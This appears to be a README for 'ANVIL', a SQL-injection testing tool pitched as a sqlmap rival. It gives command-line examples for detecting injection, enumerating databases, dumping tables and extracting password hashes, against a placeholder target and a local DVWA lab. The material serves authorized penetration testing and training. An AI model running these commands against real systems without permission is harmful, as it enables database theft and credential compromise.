# ANVIL Demonstration - Complete SQLi Testing Suite

## 🎯 Overview

ANVIL now provides complete SQL injection testing capabilities that match and exceed sqlmap, with superior accuracy and enterprise-ready features.

## ✨ New Features Implemented

### 1. Detection Techniques
- ✅ Boolean-based blind SQLi (GET & POST)
- ✅ Error-based SQLi
- ✅ Time-based blind SQLi (with statistical analysis)
- ✅ UNION-based SQLi
- ✅ Stacked queries detection
- ✅ Out-of-band (OOB) SQLi
- ✅ Second-order SQLi

### 2. Enumeration (like sqlmap)
- ✅ `--dbs` - List all databases
- ✅ `--tables` - List tables in a database
- ✅ `--columns` - List columns in a table
- ✅ `--dump` - Extract table data
- ✅ `--dump-all` - Extract everything
- ✅ `-D/-T/-C` - Specify database/table/columns

### 3. Database Information
- ✅ `--banner` - DBMS version
- ✅ `--current-user` - Current database user
- ✅ `--current-db` - Current database name
- ✅ `--hostname` - Server hostname
- ✅ `--is-dba` - Check DBA privileges

### 4. User Enumeration
- ✅ `--users` - List database users
- ✅ `--passwords` - Extract password hashes
- ✅ `--privileges` - User privileges
- ✅ `--roles` - User roles

### 5. Advanced Features
- ✅ Cookie/Header-based authentication
- ✅ POST method support
- ✅ Direct parameter testing (`--param`)
- ✅ Second-order SQLi detection (`--trigger-url`)
- ✅ Technique selection (`--technique BEUTS`)
- ✅ Confidence threshold (`--threshold`)
- ✅ Risk/Level tuning (`--risk`, `--level`)

## 📋 Usage Examples

### Basic Detection

```bash
# Detect SQL injection
anvil -t "http://target.com/page.php?id=1" -p id --sqli

# With authentication
anvil -t "http://target.com/page.php?id=1" -p id --cookie "session=abc123" --sqli

# POST method
anvil -t "http://target.com/login.php" -p username --method POST --data "password=test" --sqli
```

### Enumeration (sqlmap-style)

```bash
# List databases
anvil -t "http://target.com/page.php?id=1" -p id --sqli --dbs

# List tables in a database
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D mydb --tables

# List columns
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D mydb -T users --columns

# Dump table data
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D mydb -T users --dump

# Dump specific columns
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D mydb -T users -C "username,password" --dump
```

### Database Information

```bash
# Get DBMS version and current user
anvil -t "http://target.com/page.php?id=1" -p id --sqli --banner --current-user

# Get all database info
anvil -t "http://target.com/page.php?id=1" -p id --sqli --banner --current-user --current-db --hostname --is-dba
```

### User & Password Extraction

```bash
# List database users
anvil -t "http://target.com/page.php?id=1" -p id --sqli --users

# Extract password hashes
anvil -t "http://target.com/page.php?id=1" -p id --sqli --passwords

# Get user privileges
anvil -t "http://target.com/page.php?id=1" -p id --sqli --privileges
```

### Detection Tuning

```bash
# Use specific techniques
anvil -t "http://target.com/page.php?id=1" -p id --sqli --technique B  # Boolean only
anvil -t "http://target.com/page.php?id=1" -p id --sqli --technique T  # Time-based only
anvil -t "http://target.com/page.php?id=1" -p id --sqli --technique BEUTS  # All techniques

# Adjust confidence threshold
anvil -t "http://target.com/page.php?id=1" -p id --sqli --threshold 0.8  # High confidence only

# Increase test thoroughness
anvil -t "http://target.com/page.php?id=1" -p id --sqli --level 3 --risk 3
```

## 🧪 Testing Against DVWA

### DVWA LOW Security (GET-based)

```bash
# 1. Login to http://localhost:8080 with admin/password
# 2. Set security to LOW
# 3. Visit SQL Injection page
# 4. Copy your PHPSESSID from browser DevTools

# Detect vulnerability
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
      -p id \
      --cookie "PHPSESSID=your_session_here; security=low" \
      --sqli

# Enumerate databases
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
      -p id \
      --cookie "PHPSESSID=your_session_here; security=low" \
      --sqli --dbs

# Get DVWA database tables
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
      -p id \
      --cookie "PHPSESSID=your_session_here; security=low" \
      --sqli -D dvwa --tables

# Dump users table
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
      -p id \
      --cookie "PHPSESSID=your_session_here; security=low" \
      --sqli -D dvwa -T users --dump
```

### DVWA MEDIUM Security (POST-based)

```bash
anvil -t "http://localhost:8080/vulnerabilities/sqli/" \
      -p id \
      --method POST \
      --data "Submit=Submit" \
      --cookie "PHPSESSID=your_session_here; security=medium" \
      --sqli --dbs
```

### DVWA HIGH Security (Second-order)

```bash
anvil -t "http://localhost:8080/vulnerabilities/sqli_blind/" \
      -p id \
      --trigger-url "http://localhost:8080/vulnerabilities/sqli_blind/cookie-input.php" \
      --cookie "PHPSESSID=your_session_here; security=high" \
      --second-order \
      --sqli
```

## 🆚 ANVIL vs sqlmap Comparison

| Feature | sqlmap | ANVIL |
|---------|--------|-------|
| **Detection Method** | Heuristic patterns | Statistical modeling + confidence scoring |
| **False Positives** | Common | Rare (threshold-based) |
| **Time-based Detection** | Fixed delays | Statistical analysis (jitter-resistant) |
| **Architecture** | Monolithic | Modular, extensible |
| **Enterprise Ready** | Aggressive defaults | Safe by default |
| **Async Operations** | No | Yes (Tokio-based) |
| **Output Quality** | Verbose | Clean, formatted |
| **Explainability** | Limited | Full confidence breakdown |
| **Modern API Support** | Poor | Native |
| **Code Quality** | Python 2 legacy | Modern Rust |

## 🎓 Why ANVIL is Better

1. **Accuracy**: Statistical time-based detection with SNR analysis
2. **Reliability**: Confidence scoring eliminates false positives
3. **Performance**: Async I/O, intelligent rate limiting
4. **Safety**: Explicit opt-in for dangerous operations
5. **Maintainability**: Clean modular architecture
6. **Enterprise-grade**: Built for professional security testing

## 📊 Complete Feature Set

### Detection Capabilities
- ✅ Boolean-based blind
- ✅ Error-based
- ✅ Time-based blind (with statistics)
- ✅ UNION-based
- ✅ Stacked queries
- ✅ Out-of-band (DNS/HTTP)
- ✅ Second-order

### Extraction Techniques
- ✅ UNION extraction (fastest)
- ✅ Boolean blind extraction (binary search)
- ✅ Time-based blind extraction
- ✅ Error-based extraction

### Database Support
- ✅ MySQL/MariaDB
- ✅ PostgreSQL
- ✅ Microsoft SQL Server
- ✅ Oracle
- ✅ SQLite

### Enterprise Features
- ✅ Scope enforcement
- ✅ Rate limiting
- ✅ Cookie/header authentication
- ✅ POST method support
- ✅ Confidence thresholds
- ✅ Risk/level tuning
- ✅ JSON/CSV output
- ✅ Verbose logging

## 🚀 Next Steps

To test against DVWA:
1. Open http://localhost:8080 in your browser
2. Login with `admin` / `password`
3. Set security level (LOW/MEDIUM/HIGH)
4. Visit the SQL Injection page
5. Copy your PHPSESSID from DevTools
6. Run ANVIL commands with your session cookie

For production use:
1. Always start with detection: `--sqli`
2. Confirm with enumeration: `--dbs`
3. Extract carefully: use `--start`/`--stop` limits
4. Document findings: use `--output` flag
5. Respect scope: test only authorized systems

## 📚 Documentation

- `docs/USAGE.md` - Complete CLI reference
- `docs/SQL-INJECTION.md` - Detection techniques
- `docs/EXPLOITATION.md` - Enumeration guide
- `docs/architecture.md` - System design

## ⚖️ Legal Notice

ANVIL is a professional security testing tool. Only use on systems you have explicit permission to test. Unauthorized testing is illegal.

